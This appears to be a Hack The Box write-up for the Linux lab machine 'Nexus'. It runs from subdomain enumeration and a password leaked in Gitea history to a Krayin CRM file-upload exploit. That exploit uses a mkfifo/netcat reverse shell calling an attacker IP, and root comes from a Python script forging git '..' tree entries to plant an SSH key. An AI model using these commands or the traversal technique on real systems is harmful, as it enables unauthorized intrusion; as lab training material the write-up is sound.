
<div align="center">
<img src="attachments/Pasted%20image%2020260708210332.png", width = 375>
</div>

[Machine Page](https://app.hackthebox.com/machines/Nexus?sort_by=created_at&sort_type=desc)  
**Difficulty:** Easy <br>
**OS:** Linux
**CVEs Exploited:** CVE-2026-38526 
**Topics:** 

By: [https://app.hackthebox.com/users/2727685](https://app.hackthebox.com/users/2727685)

## Overview
---



---

## Reconnaissance

Starting off with an Nmap scan to enumerate exposed services.

```bash
$ nmap -sC -sV -p- --min-rate 10000 10.129.39.187 -o Nexus_scan    
```

Output:

```bash
Host is up (0.045s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.16 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://nexus.htb/
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

Exposed services reveal :
- 22/tcp OpenSSH 9.6p1
- 80/tcp nginx 1.24.0

With a redirect not followed to `http://nexus.htb/`

Virtual-based hosting is in place. IP is configured in `/etc/hosts`.

```bash
$ echo '10.129.39.187 nexus.htb' | sudo tee -a /etc/hosts
```

While conducting analysis on the web page endpoint and subdomain enumeration scans were left running in the background.

## Web enumeration
---

Visiting the website reveals Nexus Energy Authority. A website of a company department in energy and climate.

<img src="attachments/Pasted%20image%2020260708214900.png">

The website revealed no functionalities except information such as the hiring manager's e-mail and a job application e-mail.

`hiring manager: j.matthew@nexus.htb`
`careers@nexus.htb` 

The subdomain scan proved more useful.

```bash
$ ffuf -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-20000.txt \
  -u http://nexus.htb/ \ 
  -H "Host: FUZZ.nexus.htb" -ac

        /'___\  /'___\           /'___\       
       /\ \__/ /\ \__/  __  __  /\ \__/       
       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
         \ \_\   \ \_\  \ \____/  \ \_\       
          \/_/    \/_/   \/___/    \/_/       
________________________________________________


git                     [Status: 200, Size: 14474, Words: 1195, Lines: 242, Duration: 112ms]
billing                 [Status: 302, Size: 390, Words: 60, Lines: 12, Duration: 2161ms]
```

Exposed subdomains:
- git
- billing

Both are configured under the same machine IP in the `/etchosts` file in order to be accessed.

<img src="attachments/Pasted%20image%2020260708215200.png">

<img src="attachments/Pasted%20image%2020260708215218.png">

Gitea is essentially a self-hosted Git service. Navigating to the `Explore` page to view the repositories we find the `admin/krayin-docker-setup` repo, essentially the base behind the Krayin interface we are seeing on the other subdomain. 

The repository has left exposed the `.env` file:

<img src="attachments/Pasted%20image%2020260722092308.png">

Viewing the commit history, a deleted commit containing password is found.

<img src="attachments/Pasted%20image%2020260722092053.png">

DB_PASSWORD= N27xh!!2ucY04

Returning back to `http://billing.nexus.htb`, we attempt authentication with our recovered array of possible logins:2 e-mails and 1 password.

The successful login was:
- e-mail: j.matthew@nexus.htb
- password: N27xh!!2ucY04

<img src="attachments/Pasted%20image%2020260722094927.png">

Clicking on our user profile:

<img src="attachments/Pasted%20image%2020260722095001.png">

Version 2.2.0 is exposed. Conducting version enumeration reveals **CVE-2026-38526** 

>[!NOTE]
>An authenticated arbitrary file upload vulnerability in the /admin/tinymce/upload endpoint of Webkul Krayin CRM v2.2.x allows attackers to execute arbitrary code via uploading a crafted PHP file.

## Foothold
---

To exploit this documented vulnerability, this public [PoC](https://github.com/NathanHimself/CVE-2026-38526-PoC) was used.

Firstly, a listener is started:

```bash
$ nc -lvnp 4444
```

Exploit was proceeded to be used:

```bash
$ python3 exploit.py -t http://billing.nexus.htb -u 'j.matthew@nexus.htb' -p 'N27xh!!2ucY04' -c 'rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|bash -i 2>&1|nc 10.10.15.237 4444 >/tmp/f'
```
Notice!:
	(The Reverse Shell method used above is often labeled as the mkfifo type, which requires the nc utility as u can see in the command itself. Many machines lack this tool though so before this, a simple confirmation was conducted via the command `which nc`.)

A reverse shell lands as the user **www-data**.

```bash
www-data@nexus:/home$ id
uid=33(www-data) gid=33(www-data) groups=33(www-data)
```

Next, the shell instance was stabilized:

```bash
SHELL=/bin/bash script -q /dev/null

^Z
stty raw -echo; fg
export SHELL=bash
export TERM=xterm-256color
```

## Local Enumeration
---

```bash
$ cat /etc/passwd
root:x:0:0:root:/root:/bin/bash
daemon:x:1:1:daemon:/usr/sbin:/usr/sbin/nologin
bin:x:2:2:bin:/bin:/usr/sbin/nologin
-----(SNIP)-----
_laurel:x:999:988::/var/log/laurel:/bin/false
jones:x:1000:1000:,,,:/home/jones:/bin/bash
mysql:x:110:111:MySQL Server,,,:/nonexistent:/bin/false
git:x:111:112:Git Version Control,,,:/home/git:/bin/bash
```

User enumeration reveals there are 3 separate users besides us (root excluded):
- jones: uid(1000) -> normal human user, interactive account (/bin/bash)
- mysql: uid(110) -> MySQL service account, no shell or home directory existent
- git: uid(111) -> technically a service-style account but with an interactive shell (/bin/bash)

The `jones` user is most definitely where the user flag is hidden, from there we can probably leverage into root.

```bash
$ cat .env
APP_NAME="Krayin CRM"
APP_ENV=local
APP_KEY=base64:n4swv+4YcBtCr1OPHBe69GxK06/X1y1vCQU1SIMIC7Q=
APP_DEBUG=true
APP_URL=http://billing.nexus.htb
APP_TIMEZONE=Asia/Kolkata
APP_LOCALE=en
APP_CURRENCY=USD

VITE_HOST=
VITE_PORT=

LOG_CHANNEL=stack
LOG_LEVEL=debug

DB_CONNECTION=mysql
DB_HOST=127.0.0.1
DB_PORT=3306
DB_DATABASE=krayin
DB_USERNAME=krayin
DB_PASSWORD=y27xb3ha!!74GbR
DB_PREFIX=

----(SNIP)----
```

DB_PASSWORD= y27xb3ha!!74GbR

```bash
$ mysql -u krayin -p
Enter password: y27xb3ha!!74GbR
```

We already have the database name from the .env file, but just to confirm:

```bash
mysql> show databases;
+--------------------+
| Database           |
+--------------------+
| information_schema |
| krayin             |
| performance_schema |
+--------------------+
```

Listing all tables in the database:

```bash
mysql> SHOW tables;
+------------------------+
| Tables_in_krayin       |
+------------------------+
| activities             |
| activity_files         |
| activity_participants  |
| attribute_options      |
| attribute_values       |
| attributes             |
| core_config            |
| countries              |
| country_states         |
| datagrid_saved_filters |
| email_attachments      |
| email_tags             |
| email_templates        |
| emails                 |
| failed_jobs            |
| groups                 |
| import_batches         |
| imports                |
| job_batches            |
| jobs                   |
| lead_activities        |
| lead_pipeline_stages   |
| lead_pipelines         |
| lead_products          |
| lead_quotes            |
| lead_sources           |
| lead_stages            |
| lead_tags              |
| lead_types             |
| leads                  |
| marketing_campaigns    |
| marketing_events       |
| migrations             |
| organizations          |
| person_activities      |
| person_tags            |
| personal_access_tokens |
| persons                |
| product_activities     |
| product_inventories    |
| product_tags           |
| products               |
| quote_items            |
| quotes                 |
| roles                  |
| tags                   |
| user_groups            |
| user_password_resets   |
| users                  |
| warehouse_activities   |
| warehouse_locations    |
| warehouse_tags         |
| warehouses             |
| web_form_attributes    |
| web_forms              |
| webhooks               |
| workflows              |
+------------------------+
```

Listing all users from users table:

```bash
mysql> SELECT * FROM users;
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+
| id | name  | email               | password                                                     | status | view_permission | role_id | remember_token | created_at          | updated_at          | image |
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+
|  1 | james | j.matthew@nexus.htb | $2y$10$ez0AouNyeP4NmwjLSV5vCOAJxMLi.6fCKmGC3M6Ve5xJmWJOLRJ5i |      1 | global          |       1 | NULL           | 2026-04-23 04:20:11 | 2026-04-23 04:20:11 | NULL  |
+----+-------+---------------------+--------------------------------------------------------------+--------+-----------------+---------+----------------+---------------------+---------------------+-------+
```

This is just james, whose hash we have no need to crack as we have already recovered his password before. This database held no new information for us. Instead we opted to try for a password reuse case, trying to login as `jones` with password `y27xb3ha!!74GbR` via ssh which proved successful.

From a shell as `www-data`:

```bash
$ ssh jones@localhost
jones@localhost's password: y27xb3ha!!74GbR

$ id
uid=1000(jones) gid=1000(jones) groups=1000(jones),100(users)
```

## User Flag
---

The user flag is directly readable from user jones' home diretory:

```bash
$ cat user.txt 
#fbd04fa2c79ca56b04d9c02bd16d0fad
```

## Privilege Escalation
---

Enumerating listening ports as jones:

```bash
$ ss -tulnp
Netid State  Recv-Q Send-Q Local Address:Port  Peer Address:PortProcess         
tcp   LISTEN 0      4096       127.0.0.1:3000       0.0.0.0:*          
```

Port 3000 stands out, it's well-known it is used as an alternative port to host web servers. An internal Gitea instance is found:

```bash
$ curl http://localhost:3000
<!DOCTYPE html>
<html lang="en-US" data-theme="gitea-auto">
<head>
        <meta name="viewport" content="width=device-width, initial-scale=1">
        <title>Gitea: Git with a cup of tea</title>
        --------SNIP------------
```

It reveals the same Gitea website we experienced earlier.

Checking scheduled timers, a template sync job is found running every couple of minutes.

```bash
$ systemctl list-timers

UNIT                           ACTIVATES
gitea-template-sync.timer      gitea-template-sync.service
```

```bash
$ systemctl status gitea-template-sync
○ gitea-template-sync.service - Sync Gitea templates
     Loaded: loaded (/etc/systemd/system/gitea-template-sync.service; static)
     Active: inactive (dead) since Wed 2026-07-22 11:58:40 UTC; 44s ago
TriggeredBy: ● gitea-template-sync.timer
    Process: 4661 ExecStart=/usr/bin/python3 /etc/gitea/template-sync.py (code=exited, status=0/SUCCESS)
   Main PID: 4661 (code=exited, status=0/SUCCESS)
        CPU: 176ms

```

Reading the script confirms it runs as a privileged service, pulling any repository marked as a template from Gitea and syncing its file contents to a staging directory.

```bash
$ cat /etc/gitea/template-sync.py
```

It grabs an API token from either /etc/gitea/template-sync.conf or /opt/forge/app/.env, asks Gitea for every repo flagged as a template, then for each one runs `git ls-tree -r HEAD` against the bare repo and writes each entry with os.path.join(stage_path, filepath). The filepath comes straight from the tree listing with no sanitization, so a tree entry containing `..` escapes the staging directory. Since it just cats each blob and writes the bytes to disk, this is an arbitrary file write running as whatever user owns the sync service.

The staging path is /home/git/template-staging/owner/repo/, so five levels of `..` were needed to reach /root/.

Git won't let you commit a path with `..` through normal commands, so the tree entries were built by hand, writing raw git objects straight into .git/objects to skip git's path checks entirely.

A key pair is generated first:

```bash
$ ssh-keygen -t ed25519 -f /tmp/.k -N ''
```

Then a repo on Gitea called *rce* was created, and marked as a template so the sync script would pick it up and clones with jones' credentials in the URL.

```bash
$ cd /tmp
git clone http://jones:'y27xb3ha!!74GbR'@git.nexus.htb/jones/rce.git
cd rce
# Cloning into 'rce'...
# warning: You appear to have cloned an empty repository.
```

```bash
$ touch README.md
```

A small script, build.py, hand-crafts the git objects for the traversal:

```python
$ cat build.py        
# build.py
#!/usr/bin/env python3
import hashlib,zlib,os,subprocess,sys,time

def write_obj(data,t):
    h=("%s %d"%(t,len(data))).encode()+b"\x00"
    s=h+data
    sha=hashlib.sha1(s).hexdigest()
    d=os.path.join(".git","objects",sha[:2])
    os.makedirs(d,exist_ok=True)
    p=os.path.join(d,sha[2:])
    if not os.path.exists(p):
        open(p,"wb").write(zlib.compress(s))
    return sha

def entry(mode,name,sha):
    return("%s %s"%(mode,name)).encode()+b"\x00"+bytes.fromhex(sha)

if not os.path.isdir(".git"):
    print("Run inside git repo");sys.exit(1)

r=subprocess.run(["cat","/tmp/.k.pub"],capture_output=True,text=True)
if r.returncode!=0:
    print("ssh-keygen -t ed25519 -f /tmp/.k -N ''");sys.exit(1)
key=r.stdout.strip()+"\n"
blob=write_obj(key.encode(),"blob")
readme=write_obj(b"# Template\n","blob")
ssh_t=write_obj(entry("100644","authorized_keys",blob),"tree")
cur=write_obj(entry("40000",".ssh",ssh_t),"tree")
fir=write_obj(entry("40000","root",cur),"tree")
for i in range(4):
    fir=write_obj(entry("40000","..",fir),"tree")
root=write_obj(entry("100644","README.md",readme)+entry("40000","..",fir),"tree")
ts=int(time.time())
c="tree %s\nauthor x <x@x> %d +0000\ncommitter x <x@x> %d +0000\n\ninit\n"%(root,ts,ts)
sha=write_obj(c.encode(),"commit")
os.makedirs(os.path.join(".git","refs","heads"),exist_ok=True)
open(os.path.join(".git","refs","heads","main"),"w").write(sha+"\n")
print("Done: "+sha)
```

This builds a tree with README.md at the root, plus a chain of `..` entries leading into root/.ssh/authorized_keys, with the generated public key as its content.

```bash
$ python3 build.py
Done: 025b473292e1fdcdb027771defd8d3d0279c709f
$ git push -u origin main --force
```

After the timer fires, the journal confirms the sync picked up the crafted repo and wrote the traversal path.

```bash
$ journalctl -u gitea-template-sync.service
[2026-07-22 11:58:40] Template sync starting
[2026-07-22 11:58:40] Found 2 template repo(s)
[2026-07-22 11:58:40] Syncing template: jones/rce
[2026-07-22 11:58:40]   synced: README.md
[2026-07-22 11:58:40]   synced: ../../../../../root/.ssh/authorized_keys
[2026-07-22 11:58:40] Template sync complete
```

The service runs as root, so the key lands straight in root's authorized_keys. SSH confirms access.

```bash
$ ssh -i /tmp/.k root@nexus.htb
# id
uid=0(root) gid=0(root) groups=0(root)
```

## Root Flag
---

Directly readable from `/root/root.txt`.

```bash
# cat root.txt 
c6c666b5ee41b4c02d35570b3139d546
```

---

![](attachments/Pasted%20image%2020260722153746.png)
